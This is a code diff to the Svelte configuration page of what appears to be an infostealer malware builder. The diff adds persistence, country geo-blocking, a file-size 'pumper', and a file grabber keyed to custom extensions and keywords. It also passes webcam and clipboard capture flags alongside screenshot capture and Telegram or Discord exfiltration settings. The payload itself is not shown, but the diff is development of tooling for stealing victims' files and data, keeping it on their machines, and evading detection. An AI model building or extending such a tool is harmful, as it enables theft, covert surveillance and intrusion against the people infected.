@@ -16,6 +16,9 @@
   import { toast } from "svelte-sonner";
   import CommunicationSection from "./components/CommunicationSection.svelte";
   import FeatureSection from "./components/FeatureSection.svelte";
+  import GeoBlockSection from "./components/GeoBlockSection.svelte";
+  import PumperSection from "./components/PumperSection.svelte";
+  import FileGrabberSection from "./components/FileGrabberSection.svelte";
   import {
     Hammer,
     KeyRound,
@@ -91,6 +94,12 @@
   let captureScreenshots = $state(false);
   let captureWebcams = $state(false);
   let captureClipboard = $state(false);
+  let persistence = $state(false);
+  let blockedCountries = $state<string[]>([]);
+  let pumpSize = $state(0);
+  let pumpUnit = $state<"kb" | "mb" | "gb">("mb");
+  let customExtensions = $state<string[]>([]);
+  let customKeywords = $state<string[]>([]);
 
   let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
   let buildError = $state("");
@@ -160,6 +169,46 @@
     captureClipboard = !captureClipboard;
   };
 
+  const togglePersistence = () => {
+    persistence = !persistence;
+  };
+
+  const toggleCountry = (code: string) => {
+    if (blockedCountries.includes(code)) {
+      blockedCountries = blockedCountries.filter((c) => c !== code);
+    } else {
+      blockedCountries = [...blockedCountries, code];
+    }
+  };
+
+  const setPumpSize = (size: number) => {
+    pumpSize = size;
+  };
+
+  const setPumpUnit = (unit: "kb" | "mb" | "gb") => {
+    pumpUnit = unit;
+  };
+
+  const addExtension = (ext: string) => {
+    if (!customExtensions.includes(ext)) {
+        customExtensions = [...customExtensions, ext];
+    }
+  };
+
+  const removeExtension = (ext: string) => {
+    customExtensions = customExtensions.filter(e => e !== ext);
+  };
+
+  const addKeyword = (kw: string) => {
+    if (!customKeywords.includes(kw)) {
+        customKeywords = [...customKeywords, kw];
+    }
+  };
+
+  const removeKeyword = (kw: string) => {
+    customKeywords = customKeywords.filter(k => k !== kw);
+  };
+
   const setCommunicationMode = (mode: "telegram" | "discord") => {
     commMode = mode;
   };
@@ -227,6 +276,15 @@
       showToast(message, "Build failed", "error");
       return;
     }
+    
+    // Calculate size in MB for backend
+    let pumpSizeMb = 0;
+    if (pumpSize > 0) {
+        if (pumpUnit === "kb") pumpSizeMb = Math.ceil(pumpSize / 1024);
+        else if (pumpUnit === "mb") pumpSizeMb = pumpSize;
+        else if (pumpUnit === "gb") pumpSizeMb = pumpSize * 1024;
+    }
+
     buildStatus = "loading";
     buildError = "";
     movedTo = "";
@@ -245,6 +303,13 @@
                 telegram_chat_id: telegramChatId,
                 discord_webhook: discordWebhook,
                 capture_screenshots: captureScreenshots,
+                capture_webcams: captureWebcams,
+                capture_clipboard: captureClipboard,
+                persistence: persistence,
+                blocked_countries: blockedCountries,
+                pump_size_mb: pumpSizeMb,
+                custom_extensions: customExtensions,
+                custom_keywords: customKeywords,
               },
               branding: {
                 icon_source: iconSource,
@@ -309,9 +374,11 @@
       captureScreenshots={captureScreenshots}
       captureWebcams={captureWebcams}
       captureClipboard={captureClipboard}
+      persistence={persistence}
       onToggleScreenshots={toggleScreenshots}
       onToggleWebcams={toggleWebcams}
       onToggleClipboard={toggleClipboard}
+      onTogglePersistence={togglePersistence}
     />
 
     <CommunicationSection
@@ -334,6 +401,29 @@
         id="archive-password"
         placeholder="Archive password (optional)"
         bind:value={archivePassword}
+      />
+    </div>
+
+    <FileGrabberSection
+        customExtensions={customExtensions}
+        customKeywords={customKeywords}
+        onAddExtension={addExtension}
+        onRemoveExtension={removeExtension}
+        onAddKeyword={addKeyword}
+        onRemoveKeyword={removeKeyword}
+    />
+
+    <div class="grid gap-10 md:grid-cols-2">
+      <GeoBlockSection
+        blockedCountries={blockedCountries}
+        onToggleCountry={toggleCountry}
+      />
+
+      <PumperSection
+          pumpSize={pumpSize}
+          pumpUnit={pumpUnit}
+          onPumpSizeChange={setPumpSize}
+          onPumpUnitChange={setPumpUnit}
       />
     </div>
 
